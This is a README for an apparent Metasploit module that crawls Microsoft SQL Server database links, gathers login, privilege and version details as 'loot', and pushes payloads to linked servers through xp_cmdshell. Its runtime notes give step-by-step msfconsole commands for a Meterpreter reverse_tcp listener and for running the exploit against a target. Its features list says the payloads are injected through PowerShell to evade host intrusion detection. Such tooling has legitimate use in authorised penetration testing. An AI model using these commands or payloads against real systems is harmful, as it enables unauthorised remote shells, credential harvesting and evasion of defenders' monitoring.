Database Crawler Readme

---------------
Features
---------------
o Users can crawl Microsoft SQL database links with any valid database login.
- It provides information about each link crawled
- It identifies and handlers bad links
- It prevents persistent crawl loops

o Audit results are automatically saved in a CSV report and loot.  It includes:
- The login used to configure the database link
- The login's privilege level
- The SQL Server version
- The OS version
- The link status (alive or dead) 

o Users have the option to deliver metasploit payloads to linked servers where xp_cmdshell is enabled
o Users have the option to deliver metasploit payloads to specific server's instead of all servers
o Payloads are deployed using powershell thread injection for speed, and to avoid HIDS
o Standard and verbose screen output options are available
o Support 32 and 64 bit platforms by executing 32-bit powershell on 64 bit systems

---------------
Runtime Notes
---------------
Use this configuration for best results:

Step #1 - Start a multi/handler

use multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 0.0.0.0
set lport 443
set ExitOnSession false 
exploit -j -z           

Step #2 - Run the Module

use exploit/windows/mssql/mssql_linkcrawler
set password superpassword
set username superadmin
set rhost <target>
set payload windows/meterpreter/reverse_tcp
set lhost <localhost's ip>
set lport 443
set DisablePayloadHandler true
exploit

---------------
Current Constraints
---------------
o Cannot crawl through SQL Server 2000
o Cannot enable xp_cmdshell through links
o Cannot deliver payloads to systems without powershell (at the moment)
o Currently, the module leaves a powershell process running on exit